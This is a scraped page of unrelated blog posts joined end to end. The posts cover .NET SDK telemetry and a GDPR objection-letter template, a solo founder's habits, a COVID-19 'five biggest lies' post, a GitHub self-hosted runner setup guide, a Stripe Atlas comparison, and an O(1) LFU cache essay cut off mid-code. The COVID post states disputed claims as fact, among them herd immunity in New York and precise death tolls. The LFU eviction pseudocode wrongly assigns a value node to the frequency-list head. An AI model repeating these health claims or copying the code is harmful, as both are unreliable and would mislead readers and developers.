<p><b>Skip to the end if you just want a template for a "Right to object"
letter.</b></p>

<p>The .NET Core software development kit (SDK) is a set of command line tools
that allow development against Microsoft's .NET. When the command line tool is
run it sends some telemetry back to Microsoft.</p>

<p>This telemetry is <a href="https://aka.ms/dotnet-cli-telemetry">documented</a>, however the way it is implemented appears
against the <a href="https://gdpr-info.eu/">GDPR</a> in multiple ways.</p>

<h3>Collection by default</h3>

<p>Running <code>dotnet help</code> on a clean install, will print a message about telemetry,
but will send the details on that run.</p>

<p><a href="https://dgl.cx/2020/08/dotnet-help.png"><img src="https://dgl.cx/2020/08/dotnet-help.png"></a></p>

<p>Therefore the GDPR requriements under <a href="https://gdpr-info.eu/recitals/no-42/">"Burden of proof and requirements for
consent"</a> cannot be met -- even if we
give Microsoft the benefit of doubt and consider a command line application
somewhat special, it does not give us a chance to opt-out, yet alone opt-in.</p>

<p><a href="https://dgl.cx/2020/08/dotnet-installer.png"><img src="https://dgl.cx/2020/08/dotnet-installer.png"></a></p>

<p>During the installation process, there is a link to Microsoft's <a href="https://privacy.microsoft.com/en-gb/privacystatement">Privacy
statement</a>, however this
does not mention the environment variable needed to opt-out, so there is no way
to opt out before the first piece of data is sent.</p>

<h3>Collecting personal data</h3>

<p>The linked information page, as well as the text printed  in the CLI both say "The data is
anonymous.", it clearly isn't. They collect MAC addresses and the current
working directory, which are sent to their servers hashed.</p>

<p>A key thing to understand: <b>Hashing without a salt does not make the data
anonymous or even pseudonymous.</b></p>

<p>See for example <a href="https://medium.com/@alexewerlof/gdpr-pseudonymization-techniques-62f7b3b46a56">GDPR pseudonymisation
techniques</a>.
Given this, it is a clear violation as <a href="https://gdpr-info.eu/art-6-gdpr/">Article
6</a> requires specific purposes for processing,
but the data was claimed to be anonymous, which it isn't.</p>

<p>A common place to run "dotnet help" might be a home directory, which can often
include a username, e.g. <code>/home/dgl</code>. So while it's hashed it is easily
possible to find the hash that relates to a particular user:</p>

<pre><code>$ pwd
/home/dgl
$ echo -n $PWD | sha256sum
67acfe0ddd44867e1e5da5ddaf25a5b90e928f523cecf614e201c683b7533cf6  -
</code>
</pre>

<p>This matches the relevant part of the JSON sent:</p>

<pre><code>  "Current Path Hash": "67acfe0ddd44867e1e5da5ddaf25a5b90e928f523cecf614e201c683b7533cf6",
</code></pre>

<p>There are some discussions about the collection of MAC addresses in
<a href="https://github.com/dotnet/sdk/issues/6145">issue #6145</a> but no
particular reply from Microsoft; people suspect it's a GDPR violation. Note
that under the GDPR there are time limits for replying, so that's another
potential GDPR issue.</p>

<p>The <a href="https://dgl.cx/2020/08/ms-report.txt">report</a> I sent to Microsoft detailed how a
MAC address is likely not even 48-bits of search space, as we know what ones
are assigned, so brute-forcing is quite possible, particularly when combined
with the fact the search space can be reduced by filtering on the path
hash.</p>

<p>One principle of the GDPR is you need to explain why you're collecting
information, Microsoft do in a round about way, rather than on the link
printed by the command (<a href="https://aka.ms/dotnet-cli-telemetry">https://aka.ms/dotnet-cli-telemetry</a>) which explains what they are collecting, the "why" is hidden on a <a href="https://devblogs.microsoft.com/dotnet/what-weve-learned-from-net-core-sdk-telemetry/">blog post</a>.</p><p>

It says:
</p><blockquote>
Hashed MAC address â€” Determine a cryptographically (SHA256) anonymous and unique ID for a machine. Useful to determine the aggregate number of machines that use .NET Core. This data will not be shared in the public data releases.
<p>

Hashed current working directory â€” Determine build machines from dev machines using the heuristic of a large number of working directories. This distinction helps explain large #s of builds from a machine.
</p></blockquote>


<p>This shows a clear intention to join the data, for some purposes. The "Hashed
MAC address" is obviously understood to be somewhat sensitive as it mentions
they won't share it. Interestingly the same is not said for the current working
directory, which is also sensitive.</p>

<h3>Privacy policy</h3>

<p>As mentioned Microsoft has a <a href="https://privacy.microsoft.com/en-gb/privacystatement">general privacy policy</a>.</p>

<p>This could allow some collection, however:</p>

<blockquote>
You have choices when it comes to the technology you use and the data you
share. When we ask you to provide personal data, you can decline.
</blockquote>

<p>This behaviour would be GDPR compliant, but the key point is due to the first
collection behaviour of e.g. running <code>dotnet help</code> there is no chance to
decline. So the behaviour of the dotnet tool is inconsistent with their own
privacy policy.</p>

<h3>How to respond?</h3>

<p>I sent a report to Microsoft's security team, because arguably incorrect use of
a cryptographic hashing function (SHA256 of the items, without a salt) is a
"Security Design Flaw" which qualifies under the <a href="https://www.microsoft.com/en-us/msrc/bounty-dot-net-core">dotnet 
bug bounty</a>. This was
obviously fishing a bit, and Microsoft denied me. More surpsingly they don't
seem to consider this a problem at all, their final reply was:</p>

<blockquote>
We have updates scheduled for the first run experience and related documentation to make it more accurate. Personal data is handled consistently with GDPR requirements.
</blockquote>

<p>You'll notice that they don't talk about any actual collection changes. Also
interestingly if the data is anonymous as they claim, what "Personal data" are
they referring to in this reply?</p>

<h4>What's the route the GDPR gives us here?</h4>

<p>This is an interesting one, partly <a href="https://gdpr-info.eu/art-11-gdpr/">Article 11 Processing which does not
  require identification</a> could apply, in that they can exclude themselves
from right of access, etc. With the exception of "Right to object".</p>

<p>There are two routes, either we give enough information for Microsoft to be
happy we identify ourselves (and use the right to erasure), or we use the right
to object, which while it doesn't require Microsoft to delete the data
entirely does require them to limit their use of it.</p>

<p>So I can object to any processing of my data, and as I've proved we can use
the MAC address to find my machine in their data. I believe given this has gone
on for several years that even if they make the data collection GDPR compliant,
there is a huge historical collection of data that may need clearing as it has
been collected unlawfully.</p>

<p>In my original <a href="https://dgl.cx/2020/08/ms-report.txt">report</a> to Microsoft I made some recommendations:</p>

<pre><code>
Recommendations:
<ul><li>Remove the telemetry, it avoids any potential GDPR issues;</li>
<li>Delete the historical data (I am not a lawyer, but I suspect this has GDPR
implications);
</li></ul></code></pre>

<p>It appears they do not intend to follow these so I suggest that any user of
.NET Core SDK in the European Union takes matters into their own hands and use
their right to object:</p>

<div>
<p>
[Your full address]
[The date]</p>

<p>To Data Controller, Microsoft Corporation</p>

<p>I am exercising my right to object under the General Data Protection
Regulation (Article 21).</p>

<p>It has come to my attention that Microsoft .NET Core SDK collects telemetry,
and the opt-out process for this data is flawed.</p>

<p>In particular setting the <code>DOTNET_CLI_TELEMETRY_OPTOUT</code> variable
is only suggested the first time the tool is run, so some data may have been
collected against my will.</p>

<p>In light of Microsoft not deleting this telemetry data for everyone (per the
report of David Leadbeater on 3 August 2020). I wish that my telemetry data is
restricted from further processing, as I have set the opt-out environment
variable, but I cannot be sure that some data has not reached Microsoft
already.</p>

<p>The MAC addresses of my machine(s) is/are:</p>

<p>XX:XX:XX:XX:XX:XX</p>

<p>I believe this is enough to identify my records, as they are stored as a
SHA256 hash of this MAC address.</p>

<p>Please send a full response within one calendar month confirming if you will
comply with my request. If you cannot respond within that timescale, please
tell me when you will be able to respond.</p>

<p>If there is anything you would like to discuss, please contact me.</p>

<p>Thank you,
</p></div>

<p>Obviously the somewhat strange thing about this is you reveal your MAC
address to Microsoft in the process, but I'm fairly sure the data protection
around GDPR requests is something that is well scrutinized.</p>

<p>If you do want to send this to Microsoft go to
<a href="https://www.microsoft.com/en-GB/concern/privacy">https://www.microsoft.com/en-GB/concern/privacy</a> and select "I want to contact
Microsoftâ€™s Data Protection Officer".</p>

<p>It's strange this is still an issue as this was previously discussed over
two years ago (see this <a href="https://news.ycombinator.com/item?id=17177241">Hacker News
thread</a>). Let's use our right to object!</p>

    <p><time itemprop="datePublished">August 19, 2020</time>
    </p>
    

<p>I quit my job in January 2020 to build a privacy friendly photo organizer.</p>

<p>As a 30 year old whose friends are either getting married or planning
off-springs, what I had underestimated was the difficulty involved in finding a co-founder and how that would compound the difficulty involved in
finding an investor.</p>

<p>Once I accepted the loneliness and the lack of a financial cushion I had to figure out a way to keep building without burning myself out.</p>

<p>It took me a while, but I have found a rhythm that works, and with it, a steady
source of endorphins. Here are some changes that helped me to keep things
moving.</p>

<h2 id="being-patient">Being patient</h2>

<p>Life is no longer as comfortable as it used to be and things are not always
going the way I want them to. Preseverance has been key and indirectly patience
too. Naval’s <a href="https://twitter.com/naval/status/1261481752448524289" target="_blank">take on
meditation</a> (60 minutes x
60 days), was an eye opener. I’ve stuck with it since, and I now have an easier
time identifying negative thought patterns and sitting out situations that would
otherwise overwhelm me.</p>

<p>On some level, spending the last few months locked indoors with my parents, who
are not the most rational people in the world has also helped. But I wouldn’t
recommend it.</p>

<h2 id="reducing-procrastination">Reducing procrastination</h2>

<p>Over time I’ve realized that action precedes motivation and procrastination precedes guilt.</p>

<p>Breaking down tasks into chunks that seem trivial to accomplish has helped reduce the friction in getting started on unexciting grunt work.</p>

<p>Then there are tasks which I loathe from my core, like writing out applications
to VCs explaining why what I’m doing will matter. To those I attach reinforcing
personal reasons, like, “I need the $50k to hire that college junior who I love
working with, and that will give me spare bandwidth to focus on traction channels”.</p>

<h2 id="thinking-clearer">Thinking clearer</h2>

<p>It is sub-optimal to not have a coworker to bounce ideas off and rant about problems to. A lot of times it’s these conversations that help you gain clarity.</p>

<p>It’s a luxury I do not have so every time I feel stuck, I type/scribble my thoughts out, and then question everything that was written, and then document my realizations.</p>

<p>Task tracking has also helped in clearing the path. I write down unstructured
thoughts into a diary, and once I’ve clarity, I promote them to a Notion board
(that’s divided into <em>Thinking</em>, <em>Building</em>, <em>Reading</em>, <em>Writing</em> and
<em>Adulting</em>) and every Monday within an Excel sheet I track what was done, and
what is left to be done.</p>

<h2 id="reducing-distractions">Reducing distractions</h2>

<p>I’ve reduced my information consumption to free up brain cycles. I’ve disabled all notifications on my phone barring a few contacts, and I’ve more or less stopped browsing on it. As an added bonus, this has reduced the negativity with which I perceived the world.</p>

<p>To minimize the overhead of context switches, I split tasks into a tree of checkpoints. Before taking a break I note down the next simplest checkpoint so that when I get back to work there’s little friction to resume.</p>

<p>To help me zone out I keep <a href="https://www.youtube.com/watch?v=5qap5aO4i9A" target="_blank">lofi
beats</a> or
<a href="http://github.audio/" target="_blank">github.audio</a> playing in the background. Listening to the
latter gives me a strange sense of motivation and makes me feel less alone.</p>

<h2 id="staying-grounded">Staying grounded</h2>

<p>I’m lucky to have some friends who call/text every other week. I look at them as my accountability partners and I talk to them about what I’m doing on a high level. While not all of them genuinely care, some do, and these conversations force me to reflect on how well I’m doing what I’m doing.</p>

<p>While Silicon Valley wisdom suggests that if I’m not sleeping I should be
working, failing because of a burn out would be stupid. An advantage of not
having a VC onboard so far has been the freedom to dictate my pace. So I spend
days thinking, reading, fiddling with my violin or just doing nothing when I
feel like writing code is not what I want to do.</p>

<hr>

<p>It’s been 7 months of building alone, and while this is not how I pictured things to be on my last day at work, this is the happiest I have ever been. There’s a long way to go, and the grind seems inviting.</p>

<p>This list is by no means exhaustive, for I’m still learning. If you’ve
anything to share, please join <a href="https://news.ycombinator.com/item?id=24251403" target="_blank">the discussion on HackerNews</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div id="speakaboutWrapper"><p>Since the beginning of the pandemic, I have noticed the incredible misinformation being spread in the lay news. From the New York Times, to CNN, to Fox News, to Donald Trump himself- GIANT, OBVIOUS, LIES and ERRORS have been spread to the public. From Masks don’t work, to Hydroxychloroquine is an effective drug, to COVID-19 is a hoax, to antibodies won’t last, to the latest set of lies- herd immunity isn’t happening– all giant lies– on both sides of the aisle. Many of these have been attributed to scientists or academics with one line out-of-context quotes, throwing us under the bus, saying things we didn’t say, blatantly misconstruing or outright not understanding the <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> behind basic concepts. The lies always fall along party lines and are aimed at manipulating the public for a political agenda. Scientists have become both pawns and scapegoats to the media and politicians. I am really, really, tired of it. And it is <strong>literally KILLING Americans.</strong></p>



<p>Without facts, we can’t have rationale policy and people can’t make informed, consenting, decisions about their health. The media lies have created mass public confusion and engendered incredible mistrust of the media, politicians, and scientists and doctors (the people the public can and should trust). All the while the scientific community has had a clear eyed unchanging picture of this pandemic the whole time. The virus is not so complicated. The modeling of the virus is actually not so complicated. But if you are listening to the press, it’s a huge messy complicated whiplash of completely untrustworthy information. </p>



<p>So here are the <span><strong>Five Biggest Lies </strong></span>about COVID-19 spread by the press and politicians:</p>



<p>1.<strong>Masks don’t work. </strong></p>



<p><strong>Who spread this?</strong> Everyone. </p>



<p><strong>Why?</strong> To manipulate the public into not buying N95 masks so health care workers would have them. </p>



<p><strong>What was the harm?</strong> It made millions of Americans not believe masks work when the media about faced on this later, killing 10s of thousands. 30% less people would die if everyone wore masks. </p>



<p><strong>2. Hydroxychloroquine works.</strong></p>



<p><strong>Who spread this?</strong> Trump and the right. </p>



<p><strong>Why?</strong> I really can’t fucking figure it out for the life of me. Trump has some financial interest in the drug? You tell me.</p>



<p><strong>What was the harm?</strong> People around the world took a bogus drug with real <a href="https://realscience.community/2020/08/09/elementor-1270/">harmful side effects to their hearts and livers</a>. They also had a false sense of security that there is a treatment for COVID.</p>



<p>Some politicians (below for Ted Cruz statement), have finally admitted the harm in Hydroxycholorquine saying it directly is killing people but still cling to promoting the drug for earlier treatment despite the rigorous clinical trials showing no benefit and indeed harm with the drug. <a href="https://thetexan.news/ted-cruz-letter-to-fda-says-hydroxychloroquine-restrictions-may-be-directly-costing-lives/">https://thetexan.news/ted-cruz-letter-to-fda-says-hydroxychloroquine-restrictions-may-be-directly-costing-lives/</a>.</p>



<p><strong>3. COVID-19 is a hoax.</strong></p>



<p><strong>Who spread this?</strong> Trump and the right.</p>



<p><strong>Why?</strong> My suspicion is that they care more about keeping businesses (and their own finances) intact than saving human lives. So they want people to think COVID-19 is not dangerous so people will continue to spend money.</p>



<p><strong>What was the harm?</strong> People went about their lives in many states like the virus wasn’t harmful. This killed 100,000 more people than necessary. COVID-19 has already killed 6X the number of people this year than the flu has on average in any given year. It also very well might encourage people not to get a COVID vaccine when it becomes available- which we very much need to do.</p>



<p><strong>4. Antibodies won’t last so herd immunity might not be possible.</strong></p>



<p><strong>Who spread this?</strong> The left using scientists as pawns. Here is a quote from a review in the journal, Nature, the number one <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> journal in the world. Please note the use of “predictable” in the tagline- “Viral Immunologists say that results so far have been predictable- Here’s why that’s good news”. <strong>This pandemic has not been mysterious to scientists.</strong></p>







<figure><blockquote><p>“Several major media outlets reported this as a loss of immunity, saying that it would complicate vaccine efforts.Many immunologists found that declaration a bit premature, however. The data showed a perfectly normal response to a viral infection, says Luis Barreiro at the University of Chicago in Illinois, who studies the evolution of immune responses to pathogens. When a virus attacks, it spurs the proliferation of B cells that produce antibodies capable of recognizing pieces of the virus. But once the infection is gone, antibody levels typically wane. “There is a lot of fear out there,” says Miles Carroll, an infectious-disease specialist with Public Health England in Porton Down, UK. “But I think, on the whole, that it’s a fairly robust immune response.””</p><cite>~Nature NEWS&nbsp;&nbsp;17 AUGUST 2020<p><a href="https://www.nature.com/articles/d41586-020-02400-7">What the immune response to the coronavirus says about the prospects for a vaccine<br>Viral immunologists say that results so far have been predictable — here’s why that’s good news.</a></p></cite></blockquote></figure><p><strong>5. Herd immunity isn’t happening because there are still cases. </strong></p>



<p><strong>Who is spreading this?</strong> The left and Cuomo and crew. <a href="https://www.cnn.com/2020/08/21/health/coronavirus-immunity-frieden-opinion/index.html">CNN</a> and the <a href="https://www.latimes.com/california/story/2020-08-11/san-quentin-coronavirus-herd-immunity-covid-19?fbclid=IwAR3hDfD6XqUIv7vydOLl5cga3mlKV_TOgh0eqrgZVpMNDeBGocpC6tI8UKI">LA Times</a> have blatant lies in papers in the last two days. Here is a quote from CNN showing that they are lying about what herd immunity is. </p>



<figure><blockquote><p>“But can herd immunity result from 20-30% infection, as some misguided academics suggested recently—far lower than the usual estimate of 60-80% infection? Don’t count on it. Some communities already have a 50% infection rate or higher — this would be impossible if herd immunity kicked in at a 20-30% infection rate!”</p></blockquote></figure><p>Herd immunity means cases go down, RT&lt;1, not that they disappear or that more immunity isn’t possible. This definition is literally in <a href="https://en.wikipedia.org/wiki/Herd_immunity">Wikipedia</a>.</p>



<p>Herd immunity <a href="https://realscience.community/2020/08/17/why-i-believe-the-us-has-herd-immunity-in-some-states-and-is-barreling-towards-it-as-a-country/">is almost certainly happening</a>. <a href="https://realscience.community/2020/08/19/all-signs-point-to-herd-immunity-happening-in-parts-of-the-us-what-are-the-practical-implications/">And that is a good reason to wear a mask and not open schools. </a>Things aren’t safe yet but could be soon- we need to be careful for one more semester and ride this out- but also have hope that things will be better soon.</p>



<p><strong>Why? </strong>Because they want to protect Andrew Cuomo from the wrath of the public finding out that NYC has had herd immunity all along. They also want to point fingers at the right that their cases are going up because they are holier than thou and are using that politically. </p>



<p><strong>What is the harm?</strong> It gives the public the exact opposite impression of what is happening. New York is amongst the safer states now and Michigan is amongst the least safe. States with schools opening that do not yet have immunity should 100% not open. University of Michigan, with your 60k plus students, do not open! Take a clue from UNC Chapel Hill shutting down after one week of classes. </p>



<p>This reckless, abhorrent, blatantly false, characterization of COVID-19 and public health messaging is incredibly harmful. It has killed ~100,000 Americans. The press and politicians on both sides of the aisle need to be held accountable for this. #fakesciencenews</p>

<p><strong>23/08/2020</strong></p>

<p><img src="https://shusson.info/assets/potato.png" alt="potato"></p>

<p>Currently, github runners are hosted on azure <a href="https://docs.github.com/en/actions/reference/virtual-environments-for-github-hosted-runners">Standard_DS2_v2 VMs</a>. They have 2vCPU 7GB RAM and 14GB SSD.</p>

<p>You can self-host a runner by installing the runner service on your own infrastructure. Self-hosted runners incur no costs on github and allow you to leverage the actions api. Of course you’ll be paying for your own infrastructure, but often this will be cheaper than burning through github minutes. If you’ve got a couple idle ubuntu boxes lying around the office it’s an easy win.</p>

<p>I would recommend using a ramdisk for the workers <code>_work</code> dir as it will dramatically increase IO. Since our tests are ephemeral anyway, we don’t care if there is data loss in the <code>_work</code> directory. Any important files can be persisted using <a href="https://docs.github.com/en/actions/configuring-and-managing-workflows/persisting-workflow-data-using-artifacts">github artifacts</a>.</p>

<p>If your workflow is a <a href="https://docs.github.com/en/actions/configuring-and-managing-workflows/about-service-containers#running-jobs-in-a-container">container-job</a>, then the only dependencies are ubuntu and docker. Assuming you’ve got stock ubuntu 18.04 installed:</p>

<pre><code>sudo apt update
sudo apt install -y docker.io
sudo systemctl start docker
sudo systemctl enable docker
# requires reboot
sudo usermod -a -G docker fred


# create a ramdisk for the runners work dir
mkdir /home/fred/ramdisk
sudo chown -R fred /home/fred/ramdisk

# requires reboot
echo "tmpfs /home/fred/ramdisk tmpfs   defaults,size=3000M,nosuid,uid=1000,gid=1000   0 0" | sudo tee -a /etc/fstab

# set up the github runner
# in this example we are installing a runner to a repository, you can also install it for a org
# more info https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners
mkdir actions-runner
cd actions-runner
# note the version will most likely change in the future
curl -O -L https://github.com/actions/runner/releases/download/v2.272.0/actions-runner-linux-x64-2.272.0.tar.gz
tar xzf ./actions-runner-linux-x64-2.272.0.tar.gz
# you can find the token here: https://github.com/&lt;org&gt;/&lt;repo&gt;/settings/actions/add-new-runner
./config.sh --url https://github.com/&lt;org&gt;/&lt;repo&gt; --token "${GITHUB_TOKEN}" --name "${RUNNER_NAME}" --work /home/fred/ramdisk  --unattended  --replace
sudo ./svc.sh install
sudo ./svc.sh start
sudo ./svc.sh status
sudo reboot
</code></pre>

<p>And that’s it. You should now see the runner in your repo: e.g <code>https://github.com/&lt;org&gt;/&lt;repo&gt;/settings/actions</code></p>

<p>To tie your workflow to a self-hosted runner, use a label e.g</p>

<pre><code>jobs:
    server_tests:
        runs-on: [self-hosted, enabled]
</code></pre>

<p>You might be wondering if you can host the github runner in a docker container. Unfortunately not all features are supported yet, so depending on your workflow you might have <a href="https://github.com/actions/runner/issues/406">issues</a>.</p>

    <p><strong>Startomatic perspective:</strong></p>

<p>Stripe Atlas is a startup formation product aimed at venture capital-backed companies. These companies typically need somewhat complex legal documents allowing for outside investment, multiple types of equity, and equity compensation. Stripe Atlas only allows formation of Delaware C-corporations. They also offer to set up a US bank account for users.</p>

<p>For companies not planning to immediately raise outside investment, Stripe Atlas is somewhat expensive and offers limited choices - you cannot form an S-corporations, LLC, or entity in any state other than Delaware.</p>

<p>Stripe Atlas does not offer logo, website, trademark searches, domain name registration, company email, SEO help, or any of the numerous other features included in Startomatic’s flat fee.</p>

<p>If you are not planning to immediately raise money from professional investors, you’re not operating in Delaware, and/or you need services other than legal formation documents and a bank account, Stripe Atlas may not be a good choice. Startomatic is both less expensive and provides significantly more features, including the ability to incorporate in all 50 states.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>A common strategy to make any system super-performant is <em><a href="https://en.wikipedia.org/wiki/Cache_(computing)">Caching</a>.</em> Almost all software products, operating at scale, have multiple layers of caches in their architectures. Caching, when done right, does wonder to the response time and is one of the main reasons why products work so well at a massive scale. Cache engines are limited by the amount of memory available and hence once it gets full the engine has to decide which item should be evicted and that is where an eviction algorithm, like <a href="https://en.wikipedia.org/wiki/Least_frequently_used">LFU</a> and <a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)">LRU</a>. kicks in.</p>
<p><a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)">LRU</a> (Least Recently Used) cache eviction strategy is one of the most popular strategies out there. LFU (Least Frequently Used) strategy fares well in some use cases but a concern with its most popular implementation, where it uses a min-heap, is that it provides a running time complexity of <code>O(log n)</code> for all the three operations - insert, update and delete; because of which, more often than not, it is replaced with a sub-optimal yet extremely fast <code>O(1)</code> LRU eviction scheme.</p>
<p>In this essay, we take a look at Constant Time LFU implementation based on the paper <a href="http://dhruvbird.com/lfu.pdf">An O(1) algorithm for implementing the LFU cache eviction scheme</a> by Prof. Ketan Shah, Anirban Mitra and Dhruv Matani, where instead of using a min-heap, it uses a combination of <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">doubly-linked lists</a> and <a href="https://en.wikipedia.org/wiki/Hash_table">hash table</a> to gain a running time complexity of <code>O(1)</code> for all the three core operations.</p>

<p>LFU, very commonly, is implemented using a <a href="https://en.wikipedia.org/wiki/Min-max_heap">min-heap</a> which is organized as per the frequency of access of each element. Each element of this heap holds a pair - cached value and the access frequency; and is structured in order of this frequency such that the cached value with the minimum access frequency sits at the top, making it quick to identify the element to be evicted.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/89717235-0fd1f900-d9d2-11ea-968d-9ed67f52a2db.png" alt="min-heap LFU"></p>
<p>Although the identification of the element to be evicted is quick, but in order for the heap to maintain its property - element with lowest access frequency be at the top - it demands a rebalance, and this rebalancing process has a running complexity of <code>O(log n)</code>. To make things worse, rebalancing is required every single time the frequency of an item is changed; which means that in the cache that implements LFU, every time an item is either inserted, accessed or evicted, a rebalance is required - making all the three core operations to have the time complexity of <code>O(log n)</code>.</p>

<p>The LFU cache can be implemented with <code>O(1)</code> complexity for all the three operations by using one <a href="https://en.wikipedia.org/wiki/Hash_table">Hash Table</a> and a bunch of <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">Doubly Linked Lists</a>. As stated by the <a href="https://arpitbhayani.me/blogs/rum">RUM Conjecture</a>, in order to get a constant time reads and updates operations, we have to make a compromise with memory utilization. This is exactly what we observe in this implementation.</p>
<h2>The Hash Table</h2>
<p>The Hash Table stores the mapping of the cached key to the Value Node holding the cached value. The value against the key is usually a pointer to the actual Value Node. Given that the lookup complexity of the hash table is <code>O(1)</code>, the operation to access the value given the key from this Hash Table could be accomplished in constant time.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/90469594-e2561f80-e136-11ea-9ff4-8369a7ea3df3.png" alt="LFU hash table"></p>
<p>The illustration above depicts that the Hash Table holding cache keys <code>k1</code>, <code>k2</code>, etc are mapped to the nodes holding the values <code>v1</code> and <code>v2</code> through direct pointers. The nodes are allocated on the heap using dynamic allocation, hence are a little disorganized. The Value Node to which the key maps to, not only hold the cached value, but it also holds a few pointers pointing to different entities in the system, enabling constant-time operations.</p>
<h2>Doubly Linked Lists</h2>
<p>This implementation of LFU requires us to maintain one Doubly Linked List of frequencies, called <code>freq_list</code>, holding one node for each unique frequency spanning all the caches values. This list is kept sorted on the frequency the node represents such that, the node representing the lowest frequency is on the one end while the node representing the highest frequency is at the other.</p>
<p>Every Frequency Node holds the frequency that it represents in the member <code>freq</code> and the usual <code>next</code> and <code>prev</code> pointers pointing to the adjacent Frequency Nodes; it also keeps a <code>values_ptr</code> which points to another doubly-linked list holding Value Nodes (referred in the hash table) having the same access frequency <code>freq</code>.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/90469593-e08c5c00-e136-11ea-995b-e4590981dd89.png" alt="lists LFU"></p>
<p>The overall schematic representation of doubly-linked lists and its arrangement is as shown in the illustration above. The doubly-linked list holding Frequency Nodes is arranged horizontally while the list holding the Value Nodes is arranged vertically, for clearer view and understanding.</p>
<p>Since the cached values <code>v1</code> and <code>v7</code> both have been accessed <code>7</code> times, they both are chained in a doubly-linked list and are hooked with the Frequency Node representing the frequency of <code>7</code>. Similarly, the Value Nodes holding values <code>v5</code>, <code>v3</code>, and <code>v9</code> are chained in another doubly-linked list and are hooked with the Frequency Node representing the frequency of <code>18</code>.</p>
<p>The Value Node contains the cached value in member <code>data</code>, along with the usual <code>next</code> and <code>prev</code> pointers pointing to the adjacent Value Nodes in the list. It also holds a <code>freq_pointer</code> pointing back to the Frequency Node to which the list if hooked at. Having all of these pointers helps us ensure all the three operations happen in constant time.</p>
<p>Now that we have put all the necessary structures in place, we take a look at the 3 core operations along with their pseudo implementation.</p>
<h2>Adding value to the cache</h2>
<p>Adding a new value to the cache is a relatively simpler operation that requires a bunch of pointer manipulations and does the job with a constant time running complexity. While inserting the value in the cache, we first check the existence of the key in the table, if the key is already present and we try to put it again the function raises an error. Then we ensure the presence of the Frequency Node representing the frequency of <code>1</code>, and in the process, we might also need to create a new frequency node also. Then we wrap the value in a Value Node and adds it to the <code>values_list</code> of this Frequency Node; and at last, we make an entry in the table acknowledging the completion of the caching process.</p>
<pre><code><span><span>def</span> <span>add</span><span>(key: str, value: object)</span>:</span>
    
    
    <span>if</span> key <span>in</span> table:
        <span>raise</span> KeyAlreadyExistsError

    
    
    value_node = make_value_node(value)

    first_frequency_node = freq_list.head
    <span>if</span> first_frequency_node.freq != <span>1</span>:
        
        
        first_frequency_node = make_frequency_node(<span>1</span>)

        
        
        
        first_frequency_node.next = freq_list.head
        freq_list.head.prev = first_frequency_node
        freq_list.head = first_frequency_node

    
    value_node.freq_pointer = first_frequency_node

    
    first_frequency_node.values.add(value_node)

    
    table[key] = value_node
</code></pre>
<p>As seen in the pseudocode above the entire procedure to add a new value in the cache is a bunch of memory allocation along with some pointer manipulations, hence we observe that the running complexity of <code>O(1)</code> for this operation.</p>
<h2>Evicting an item from the cache</h2>
<p>Eviction, similar to insertion, is a trivial operation where we simply pick the frequency node with lowest access frequency (the first node in the <code>freq_list</code>) and remove the first Value Node present in its <code>values_list</code>. Since the entire eviction also requires pointer manipulations, it also exhibits a running complexity of <code>O(1)</code>.</p>
<pre><code><span><span>def</span> <span>evict</span><span>()</span>:</span>
    <span>if</span> freq_list.head <span>and</span> freq_list.head.values:
        first_value_node = freq_list.head.values.first
        second_value_node = first_value_node.next

        
        freq_list.head = second_value_node

        
        second_value_node.prev = <span>None</span>

        
        delete_value_node(first_value_node)

    <span>if</span> freq_list.head <span>and</span> <span>not</span> freq_list.head.values:
        
        
        delete_frequency_node(freq_list.head)
</code></pre>
<h2>Getting a value from the cache</h2>
<p>Accessing an item from the cache has to be the most common operation of any cache. In the LFU scheme, before returning the cached value, the engine also has to update its access frequency. Ensuring the change in access frequency of one cached value does not require some sort of rebalancing or restructuring to maintain the integrity, is what makes this implementation special.</p>
<p>The engine first makes a get call to the Hash Table to check that the key exists in the cache. Before returning the cached value from the retrieved Value Node, the engine performs the following operations - it accesses the Frequency Node and its sibling corresponding to the retrieved Value Node. It ensures that the frequency of the sibling is 1 more than that of the Frequency Node; if not it creates the necessary Frequency Node and place it as the new sibling. The Value Node then changes its affinity to this sibling Frequency Node so that it correctly matches the access frequency. In the end, the back pointer from the Value Node to the new Frequency Node is set and the value is returned.</p>
<pre><code><span><span>def</span> <span>get</span><span>(key: str)</span> -&gt; object:</span>
    
    value_node = table.get(key, <span>None</span>)

    
    
    <span>if</span> <span>not</span> value_node:
        <span>raise</span> KeyNotFoundError

    
    
